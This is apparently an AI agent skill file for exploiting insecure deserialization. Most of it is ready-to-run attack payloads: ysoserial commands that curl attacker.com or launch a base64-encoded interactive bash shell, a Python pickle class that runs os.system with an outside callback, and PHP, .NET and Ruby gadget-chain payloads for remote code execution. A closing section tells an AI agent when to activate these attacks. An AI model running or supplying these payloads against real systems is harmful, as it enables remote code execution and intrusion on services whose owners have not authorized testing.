# Insecure Deserialization Skill

## Goal

Identify and exploit insecure deserialization vulnerabilities to achieve remote code execution or other attacks.

## Methodology

1. **Identify Serialized Data:** Find serialized objects in cookies, parameters, or API responses
2. **Detect Serialization Format:** Identify Java, PHP, Python, .NET, or other formats
3. **Modify Object Data:** Tamper with serialized objects
4. **Inject Gadget Chains:** Use known gadget chains for code execution
5. **Achieve RCE:** Execute arbitrary commands via deserialization

## Identifying Serialized Data

```bash
# Java (Base64 encoded)
rO0AB...  # Starts with "rO0AB" (Base64 of 0xaced magic bytes)
H4sIAAAA  # GZipped serialized object

# PHP
O:4:"User":2:{s:4:"name";s:5:"admin";...}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}

# Python Pickle
gASV...   # Base64 encoded pickle
\x80\x04\x95  # Raw pickle bytes

# .NET ViewState
/wEPDwUK...
```

## Java Deserialization

```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/pwned' | base64

# Common gadget chains
- CommonsCollections1-7
- Hibernate
- Spring
- JBoss
```

### Java Payload Example
```java
// ysoserial command
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+...}|{base64,-d}|{bash,-i}" > payload.bin
```

## PHP Deserialization

```php
// Vulnerable: unserialize($_COOKIE['data']);

// Malicious object
O:8:"Exploit":1:{s:4:"data";s:20:"system('id');";}

// POP chain exploitation
O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/tmp/shell";}
```

### PHP Gadget Finder
```bash
# phpggc - PHP Generic Gadget Chains
./phpggc Laravel/RCE1 system 'id'
./phpggc Symfony/RCE4 exec 'id'
```

## Python Pickle

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/pwned',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
```

## .NET Deserialization

```bash
# ysoserial.net
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
```

## Ruby Deserialization

```ruby
# Universal RCE gadget chain
require 'base64'
require 'erb'

payload = ERB.allocate
payload.instance_variable_set(:@src, "<%= `id` %>")
payload.instance_variable_set(:@filename, "x")
puts Base64.encode64(Marshal.dump(payload))
```

## Tools

* **ysoserial** - Java deserialization payloads
* **ysoserial.net** - .NET deserialization payloads
* **phpggc** - PHP gadget chains
* **peas** - Python deserialization payloads

## Guidance for AI

* Activate when testing applications with serialized data (cookies, ViewState, etc.)
* Identify the serialization format first (Java, PHP, Python, .NET)
* Use framework-specific gadget chain tools
* Base64 encoding is common; decode to identify format
* Java objects start with `0xaced` magic bytes
* Check for vulnerable libraries in the classpath (Commons Collections, etc.)
* Blind deserialization can be confirmed via DNS/HTTP callbacks
